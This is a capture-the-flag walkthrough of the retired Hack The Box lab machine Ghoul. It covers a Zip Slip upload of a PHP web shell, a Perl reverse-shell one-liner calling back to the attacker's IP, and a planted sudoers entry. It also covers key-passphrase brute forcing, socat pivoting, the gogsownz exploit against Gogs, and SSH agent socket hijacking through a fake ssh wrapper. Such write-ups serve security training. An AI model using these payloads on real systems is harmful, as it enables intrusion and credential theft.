---
layout: post
title: "Ghoul: Hack The Box Walkthrough"
date: 2019-10-06 18:05:44 +0000
last_modified_at: 2019-10-06 18:05:44 +0000
category: Walkthrough
tags: ["Hack The Box", Ghoul, retired]
comments: true
image:
  feature: ghoul-htb-walkthrough.jpg
  credit: vinsky2002 / Pixabay
  creditlink: https://pixabay.com/photos/ken-male-young-man-japanese-anime-3745445/
---

This post documents the complete walkthrough of Ghoul, a retired vulnerable [VM][1] created by [egre55][2] and [MinatoTW][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Ghoul is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.101 --rate=700

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-06 06:49:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.101                                    
Discovered open port 8080/tcp on 10.10.10.101                                  
Discovered open port 22/tcp on 10.10.10.101                                    
Discovered open port 2222/tcp on 10.10.10.101
```

Interesting. Let's do one better with `nmap` scanning the discovered ports to see what are the services.

```
# nmap -n -v -Pn -p22,2222,80,8080 -A --reason -oN nmap.txt 10.10.10.101
Nmap scan report for 10.10.10.101
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: A64A06AAE4304C2B3921E4FA5C9FF39C
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Aogiri Tree
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
8080/tcp open  http    syn-ack ttl 62 Apache Tomcat/Coyote JSP engine 1.1
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Aogiri
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88 - Error report
```

Nothing unusual. Here's what the `http` services look like.

_`80/tcp`_


{% include image.html image_alt="9c634f32.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/9c634f32.png" %}


_`8080/tcp` (`admin:admin`)_


{% include image.html image_alt="a4d9ccd7.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/a4d9ccd7.png" %}


Looks like we have an uploader.

### Directory/File Enumeration

But first, let's touch base with `gobuster` first on `80/tcp`.

```
# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 20 -e -x php,htm,html,txt -u http://10.10.10.101/                

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.101/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,htm,html,txt
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2019/05/07 02:09:07 Starting gobuster
=====================================================
http://10.10.10.101/images (Status: 301)
http://10.10.10.101/index.html (Status: 200)
http://10.10.10.101/blog.html (Status: 200)
http://10.10.10.101/contact.html (Status: 200)
http://10.10.10.101/archives (Status: 301)
http://10.10.10.101/uploads (Status: 301)
http://10.10.10.101/users (Status: 301)
http://10.10.10.101/css (Status: 301)
http://10.10.10.101/js (Status: 301)
http://10.10.10.101/secret.php (Status: 200)
http://10.10.10.101/less (Status: 301)
=====================================================
2019/05/07 03:38:47 Finished
=====================================================
```

`secret.php` looks interesting.


{% include image.html image_alt="d818a59f.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/d818a59f.png" %}


Looks like we have a remote command/code execution (RCE) vulnerability somewhere! :triumph:

### Zip Slip Vulnerability

It's easy to miss this if you don't navigate around for a bit.


{% include image.html image_alt="9ee80aa2.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/9ee80aa2.png" %}


You can upload zip files and looks like I found where the files are uploaded to.


{% include image.html image_alt="8ce8eb48.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/a36c0092.png" %}


What does that tell you? The [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability)!

Legend has it that,

> Zip Slip is a widespread arbitrary file overwrite critical vulnerability, which typically results in _remote command execution_. It was discovered and responsibly disclosed by the Snyk Security team ahead of a public disclosure on 5th June 2018, and affects thousands of projects, including ones from HP, Amazon, Apache, Pivotal and [many more (CVEs and full list here)](https://github.com/snyk/zip-slip-vulnerability).

I guess someone from Aogiri didn't get the memo.

In any case, you need to craft a Zip file that contains several levels of directory traversal as file name, e.g. `../../../../../../../../evil.txt`,  in order to write `evil.txt` to `/`, the root directory. You have a better chance of traversing to the root directory with multiple levels of `../` because the traversal will eventually revert to the root directory beyond a certain number of levels. The vulnerability exists because there's no proper sanitization checks with the file name in most Zip extraction code. This is most prevalent in Java. And guess what, this upload code is written in Java Server Pages (or JSP).

To create the malicious Zip file, we can use [`evilarc`](https://github.com/ptoomey3/evilarc). What kind of file do we put inside the Zip file? PHP of course. Remember that Apache/PHP runs behind `80/tcp`?

Let's zip this little bad boy.

<div class="filename"><span>cmd.php</span></div>

```php
<pre>
<?php echo shell_exec($_GET[0]); ?>
</pre>
```


{% include image.html image_alt="d970e545.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/d970e545.png" %}


We want to put `cmd.php` at the document root (likely to be `/var/www/html`) of `80/tcp`.


{% include image.html image_alt="4c56b9f9.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/4c56b9f9.png" %}


Bam. We have remote command execution alright.

## Low-Privilege Shell

From here on, it's easy to get a shell. I'm using the following Perl one-liner.

```
perl -e 'use Socket;$i="10.10.14.11";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

It's best to `urlencode` the one-liner to prevent any complications when passing it as an URL. On my `nc` listener, a shell appears...


{% include image.html image_alt="5e81818d.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/5e81818d.png" %}


It's equally easy to [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) the shell to a full TTY.

During enumeration of the `www-data` account, you'll realize that `8080/tcp` is running as `root`. As such, we can use Zip Slip to write to anywhere, e.g. `/etc/sudoers.d`. Wait a tick, it can't be that easy right? Well, that's because we are inside a docker container.

Here's a snippet of the output of `mount`. It has all the hallmarks of a docker container.


{% include image.html image_alt="c3b6c4ed.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/c3b6c4ed.png" %}


Lucky for us, `user.txt` is in this container (`aogiri`).


{% include image.html image_alt="4f8c2e77.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/4f8c2e77.png" %}


How do we become `root`? We can write a sudoers file to `/etc/sudoers.d` with Zip Slip as follows.

```
www-data ALL=(ALL) NOPASSWD:ALL
```

It basically lets `www-data` do anything as `root` without password, including becoming `root`!


{% include image.html image_alt="90427414.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/90427414.png" %}


Well, with that we can grab all the users' SSH keys (in the event of a reset, we can use the keys to log in) as well as discover what other connections to other containers we have.


{% include image.html image_alt="8bc83904.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/8bc83904.png" %}


### Lateral Movement

In order to probe other containers, we need to a few basic tools like `nc` and `socat`. We can download a copy of statically-compiled `socat` from this [repository](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64).

We'll then slip these tools in with the Zip Slip, :smirk: or if you prefer, with `scp`.


{% include image.html image_alt="c3b6f6cd.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/c3b6f6cd.png" %}



{% include image.html image_alt="28d69bee.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/28d69bee.png" %}


I think we are good to go.


{% include image.html image_alt="478e1ae5.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/478e1ae5.png" %}


### Port-scan 101

The first step of port-scanning is to determine your targets whether they are up or not.


{% include image.html image_alt="cf148e9f.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/cf148e9f.png" %}


Aogiri has an IP of `172.20.0.10/16`. Let's use the following command to `ping` the entire `/24` subnet to see who's alive.


{% include image.html image_alt="0a6ad143.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/0a6ad143.png" %}


Awesome, we have `172.20.0.150`. We can run a very rudimentary port scan with `nc`'s zero I/O mode like so.


{% include image.html image_alt="e90cfe37.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/e90cfe37.png" %}


If I had to guess, I would say that `172.20.0.150` is actually `kaneki-pc`. `kaneki` left clues in his home directory.


{% include image.html image_alt="c0678318.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/c0678318.png" %}


`kaneki` talks of transfering files to the server (???) using his PC.


{% include image.html image_alt="fd093e2c.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/fd093e2c.png" %}


Feels like [Reddish](https://hackso.me/reddish-htb-walkthrough/) all over again. Anyways, the username to `kaneki-pc` is `kaneki_pub`. The private key in `.ssh` is also password protected which makes it even more likely to be the private key for `kaneki-pc`.


{% include image.html image_alt="0628f069.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/0628f069.png" %}


The question now is what's the password?

### Decrypting RSA Private Key

Let's `scp` the password-protected RSA private key to my attacking machine for cracking. Towards that end, I wrote a very simple `bash` script to brute-force the password with `openssl` as the main driver.

<div class="filename"><span>brute.sh</span></div>

```bash
#!/bin/bash

FILE=$1
PASS=$2

die() {
  killall perl 2>/dev/null
}

if openssl rsa -in $FILE -out $FILE.pem -passin pass:$2 2>/dev/null; then
  printf "\n%s\n" "[+] Password is: $PASS"
  die
fi
```

The first argument is the key; the second argument is the attempted password. Combine this script with [GNU Parallel](https://www.gnu.org/software/parallel/) and a good wordlist, and you got yourself a powerful, multi-threaded cracker of sorts. :laughing:

Well, I've tried the famed wordlist `rockyou.txt` with no luck. Then it dawned upon me that the wordlist could come from the site. Remember the secret chat group? We can use `cewl` to extract a wordlist from it.


{% include image.html image_alt="f0cc9e8a.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/f0cc9e8a.png" %}


Lame, I know.

### Kaneki's PC (172.20.0.150)

Time to test our log in.


{% include image.html image_alt="153ad0e7.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/153ad0e7.png" %}


Indeed! And guess what, more clues.


{% include image.html image_alt="2aa07839.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/2aa07839.png" %}


It shouldn't come as a surprise, but `kaneki-pc` is dual-homed.


{% include image.html image_alt="0e5cbd03.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/0e5cbd03.png" %}


Time to copy tools like `nc` and `socat` over with `scp`.


{% include image.html image_alt="35ec42c4.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/c4661894.png" %}


Let's repeat the port-scan steps.


{% include image.html image_alt="674af273.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/674af273.png" %}


Looks like we have another docker container at `172.18.0.2`. Let's scan with for open ports with `nc` again.


{% include image.html image_alt="11a0472e.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/11a0472e.png" %}


### Serious Pivoting

Here's the game plan: I set up `socat` to listen at `3000/tcp` on `kaneki-pc` and forward all the traffic to `172.18.0.2` at `3000/tcp`. I then set up dynamic port forwarding with my SSH session to `aogiri`. I should be able to access `3000/tcp` at `172.18.0.2` right from my browser. Here's an ASCII illustration of the network links. I'm obviously the attacker. :smiling_imp:

```
aogiri (172.20.0.10) <-> (172.20.0.150) kaneki-pc (172.18.0.200) <-> (172.18.0.2) ???
   ^
   |
   |
attacker
```

_On `kaneki-pc`_

```
$ ./socat tcp-listen:3000,fork tcp:172.18.0.2:3000 &
```

_On my attacking machine_

```
# ssh -D9999 -i ssh/aogiri root@10.10.10.101 -f -N
```


{% include image.html image_alt="843fcd3f.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/843fcd3f.png" %}


There you have it.

### Gogs 0.11.66 a.k.a gogsownz

`kaneki` mentioned something about Gogs in `note.txt` and something about _giving `AogiriTest` user access to Eto for git_ as well.


{% include image.html image_alt="062f99cd.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/062f99cd.png" %}


[TheZ3ro](https://github.com/TheZ3ro) wrote an awesome generic exploit tool ([`gogsownz`](https://github.com/TheZ3ro/gogsownz)) for several Gogs CVEs. In particular, Gogs 0.11.66 is susceptible to remote code execution via `git` hooks. To do that, we need credentials. That sent me on a wild goose chase for passwords. In the end, I found a commented password at `/usr/share/tomcat7/conf/tomcat-users.xml`.


{% include image.html image_alt="377b059e.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/377b059e.png" %}


Damn. Even using `gogsownz` need some digging into the source code. I've done my homework. Gogs configuration file is at [app.ini](https://gogs.io/docs/advanced/configuration_cheat_sheet) and the default [values](https://github.com/gogs/gogs/blob/master/conf/app.ini) can be found in the Gogs [repository](https://github.com/gogs/gogs).

From the official documentation of Gogs, we know a couple of things:

+ Default running user is `git`
+ SSH home page is `~/.ssh`

As such, we can run `gogsownz` and put in a SSH public we control to `~/.ssh/authorized_keys` like so.

```
# ./gogsownz.py http://172.20.0.150:3000/ -v --cookie-name 'i_like_gogits' --creds 'AogiriTest:test@aogiri123' --rce "echo $(cat ssh/git.pub) >> ~/.ssh/authorized_keys" --cleanup --burp
[i] Starting Gogsownz on: http://172.20.0.150:3000
[+] Loading Gogs homepage
[i] Gogs Version installed: © 2018 Gogs Version: 0.11.66.0916                                      
[i] The Server is redirecting on the login page. Probably REQUIRE_SIGNIN_VIEW is enabled so you will
 need an account.
[+] Performing login
[+] Logged in sucessfully as AogiriTest
[+] Got UserID 2
[+] Repository created sucessfully
[i] Exploiting authenticated PrivEsc...
[+] Uploading admin session as repository file
[+] Uploaded successfully.
[+] Committing the Admin session
[+] Committed sucessfully
[+] Removing Repo evidences
[+] Repo removed sucessfully
[i] Signed in as kaneki, is admin True
[i] Current session cookie: 'b3d8001337'
[+] Got UserID 1
[+] Repository created sucessfully
[+] Setting Git hooks
[+] Git hooks set sucessfully
[+] Fetching last commit...
[+] Got last commit
[+] Triggering the RCE with a new commit
[+] Committed sucessfully
[i] Performed RCE successfully
[i] Waiting 10 seconds before cleaning up...
[+] Removing Repo evidences
[+] Repo removed sucessfully
[i] Done!
```

Awesome. Transfer the private key to `kaneki-pc` and we should be able to gain access to the Gogs server.


{% include image.html image_alt="a2d61c22.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/a2d61c22.png" %}


During enumeration of `git`'s account, I noticed an unusual `setuid` executable `gosu`.


{% include image.html image_alt="2bd99e70.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/2bd99e70.png" %}


From the help, it appears that `gosu` is like `sudo`.


{% include image.html image_alt="69419f2a.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/69419f2a.png" %}


Let's see if we can make ourselves `root`.


{% include image.html image_alt="24125fb2.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/24125fb2.png" %}


Sweet. Check out what's in `/root`.


{% include image.html image_alt="93d4376c.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/93d4376c.png" %}


Suffice to say, I copied `aogiri-app.7z` back to my machine for further analysis.

### Aogiri Chat Application

Diffing the commits reveal the following.


{% include image.html image_alt="69020dc3.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/69020dc3.png" %}


I tried the password on `kaneki-pc`'s `root` with no effect. It turns out that git objects kept a complete history of what was written to the file. Pretty neat stuff.

All the object files are zlib compressed data.


{% include image.html image_alt="11ae6b7c.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/11ae6b7c.png" %}


As such, we can use `unpigz` to uncompress these object files to display plaintext onto `stdout` like so.

```
# find . -type f -exec unpigz -c {} \; 2>/dev/null | tr -cd '[:print:]\n' | less
```


{% include image.html image_alt="a146c303.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/a146c303.png" %}


The highlighted password is the correct one to `su` as `root`. And guess what's in there? `root.txt`!


{% include image.html image_alt="29109d02.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/29109d02.png" %}


Damn, again. :angry:

## Privilege Escalation

During enumeration of `root` in `kaneki-pc`, I noticed something weird. This occurs every couple of minutes. `kaneki_adm` logs in to `kaneki-pc` only to log in to `172.18.0.1` as `root` at `2222/tcp` to execute `log.sh`.


{% include image.html image_alt="752423da.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/752423da.png" %}


It appears that SSH agent forwarding to the `docker` host is enabled on `kaneki-pc`  because that command didn't work when I tried it. Check out `/etc/ssh/ssh_config` in `kaneki-pc`.

```
# This is the ssh client system-wide configuration file.  See
# ssh_config(5) for more information.  This file provides defaults for
# users, and the values can be changed in per-user configuration files
# or on the command line.

# Configuration data is parsed as follows:
#  1. command line options
#  2. user-specific file
#  3. system-wide file
# Any configuration value is only changed the first time it is set.
# Thus, host-specific definitions should be at the beginning of the
# configuration file, and defaults at the end.

# Site-wide defaults for some commonly used options.  For a comprehensive
# list of available options, their meanings and defaults, please see the
# ssh_config(5) man page.

Host *
    ForwardAgent yes
#   ForwardX11 no
#   ForwardX11Trusted yes
#   PasswordAuthentication yes
#   HostbasedAuthentication no
#   GSSAPIAuthentication no
#   GSSAPIDelegateCredentials no
#   GSSAPIKeyExchange no
#   GSSAPITrustDNS no
#   BatchMode no
#   CheckHostIP yes
#   AddressFamily any
#   ConnectTimeout 0
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel QUIET
#   IdentityFile ~/.ssh/id_rsa
#   IdentityFile ~/.ssh/id_dsa
#   IdentityFile ~/.ssh/id_ecdsa
#   IdentityFile ~/.ssh/id_ed25519
#   Port 22
#   Protocol 2
#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
#   EscapeChar ~
#   Tunnel no
#   TunnelDevice any:any
#   PermitLocalCommand no
#   VisualHostKey no
#   ProxyCommand ssh -q -W %h:%p gateway.example.com
#   RekeyLimit 1G 1h
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
```

This can only mean one thing: someone in the `docker` host has a private key stored in the memory of a `ssh-agent`, which makes SSH login to a destination server through an intermediate server painless and password-less. However, in the event the intermediate server is compromised, an attacker can easily hijack the Unix socket used for communicating with the agent for nefarious purposes.

Towards that end, I switched the actual `ssh` at `/usr/bin/ssh` for a "fake" `ssh` at `/usr/local/bin/ssh`, which is nothing more than the following script.

```bash
#!/bin/bash

/usr/bin/ssh $@; find / -type s 2>/dev/null >/tmp/evil
```

Check out the `PATH` environment variable.


{% include image.html image_alt="aa4719db.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/aa4719db.png" %}


Notice that `/usr/local/bin` is at a higher executable search priority than `/usr/bin`?

Once the "fake" `ssh` is executed, the path to the Unix socket used for communicating with the agent is saved to `/tmp/evil`.

We can set up a `watch` on `w` to monitor who logs in to `kaneki-pc`. The moment `kaneki_adm` logs in to execute `ssh root@172.18.0.1 -p 2222 -t ./log.sh`, we'll execute the following script to hijack that socket and use it to log in as `root` to `172.18.0.1` at `2222/tcp`.

```bash
#!/bin/bash

export SSH_AUTH_SOCK=$(cat /tmp/evil)

ssh root@172.18.0.1 -p 2222
```


{% include image.html image_alt="8562251a.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/8562251a.png" %}


We are in the endgame now.


{% include image.html image_alt="19232d2a.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/19232d2a.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/187
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu/home/users/profile/8308
[4]: https://www.hackthebox.eu/
